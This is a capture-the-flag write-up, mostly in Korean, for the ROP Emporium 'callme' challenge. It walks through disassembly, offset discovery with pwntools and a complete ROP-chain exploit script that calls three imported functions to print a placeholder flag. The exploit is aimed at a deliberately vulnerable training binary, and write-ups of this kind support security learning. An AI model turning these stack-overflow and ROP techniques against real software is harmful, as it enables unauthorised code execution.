# [callme](https://ropemporium.com/challenge/callme.html)
<br />

**Discription:**
> Reliably make consecutive calls to imported functions.
Use some new techniques and learn about the Procedure Linkage Table.
<br />
<br />

# x86_64

**Binary Protections:**
```yaml
  [*] '/home/kali/pico/callme'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```
<br />

> [!WARNING]
> `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`
> <br />
> `callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`
> <br />
> `callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`
> 
> 인자를 올바를 순서로 각 함수를 순서대로 호출해야 FLAG가 출력됩니다.

<br />


```yaml
$ objdump -d callme

callme:     file format elf64-x86-64

Disassembly of section .text:
...
00000000004008f2 <usefulFunction>:
  4008f2:       55                      push   %rbp
  4008f3:       48 89 e5                mov    %rsp,%rbp
  4008f6:       ba 06 00 00 00          mov    $0x6,%edx
  4008fb:       be 05 00 00 00          mov    $0x5,%esi
  400900:       bf 04 00 00 00          mov    $0x4,%edi
  400905:       e8 e6 fd ff ff          call   4006f0 <callme_three@plt>
  40090a:       ba 06 00 00 00          mov    $0x6,%edx
  40090f:       be 05 00 00 00          mov    $0x5,%esi
  400914:       bf 04 00 00 00          mov    $0x4,%edi
  400919:       e8 22 fe ff ff          call   400740 <callme_two@plt>
  40091e:       ba 06 00 00 00          mov    $0x6,%edx
  400923:       be 05 00 00 00          mov    $0x5,%esi
  400928:       bf 04 00 00 00          mov    $0x4,%edi
  40092d:       e8 ee fd ff ff          call   400720 <callme_one@plt>
  400932:       bf 01 00 00 00          mov    $0x1,%edi
  400937:       e8 14 fe ff ff          call   400750 <exit@plt>
000000000040093c <usefulGadgets>:
  40093c:       5f                      pop    %rdi
  40093d:       5e                      pop    %rsi
  40093e:       5a                      pop    %rdx
  40093f:       c3                      ret
...
```
위 결과로 `usefulFunction`, `usefulGadgets`는 풀이에 필요한 정보를 담고 있음을 알 수 있습니다.

```yaml
$ python3 -q
>>> from pwn import *
>>> p = process("./callme")
[+] Starting local process './callme': pid 1512
>>> p.sendline(cyclic(600, n=8))
>>> p.wait()
[*] Process './callme' stopped with exit code -11 (SIGSEGV) (pid 1512)
>>> Corefile("./core.1512")
[+] Parsing corefile...: Done
[*] '/home/kali/pico/core.1512'
    Arch:      amd64-64-little
    RIP:       0x4008f1
    RSP:       0x7ffe6f9cb538
    Exe:       '/home/kali/pico/callme' (0x400000)
    Fault:     0x6161616161616166
Corefile('/home/kali/pico/core.1512')
>>> cyclic_find(0x6161616161616166, n=8)
40
```
오프셋은 40 입니다. 해당 정보들로 공격 코드를 작성할 수 있습니다.

<br />

```python
from pwn import *

context.log_level = "error"
context.arch = "amd64"

p = process("./callme")

gadgets = 0x000000000040093c
func = [0x400720, 0x400740, 0x4006f0]
arguments = [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d]

pay = flat(
	{40:gadgets}, arguments, func[0],
	gadgets, arguments, func[1],
	gadgets, arguments, func[2]
)

p.sendline(pay)
p.interactive()
```
```bash
$ python3 test.py
callme by ROP Emporium
x86_64

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
$
```
